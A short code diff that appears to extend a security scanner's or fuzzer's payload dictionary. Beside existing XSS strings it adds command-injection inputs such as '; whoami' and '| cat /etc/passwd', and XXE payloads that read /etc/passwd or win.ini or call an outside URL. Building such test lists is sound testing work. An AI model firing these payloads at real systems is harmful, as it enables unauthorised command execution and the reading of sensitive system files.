@@ -5,6 +5,18 @@ const payloadsByType = {
     '<img src=x onerror=alert(1)>',
     '" onmouseover="alert(1)"',
     '<svg/onload=alert(1)>'
+  ],
+  command: [
+    '; whoami',
+    '&& id',
+    '| cat /etc/passwd',
+    '$(uname -a)',
+    '`whoami`'
+  ],
+  xxe: [
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://example.com/xxe">]><data>&xxe;</data>'
   ]
 };
 
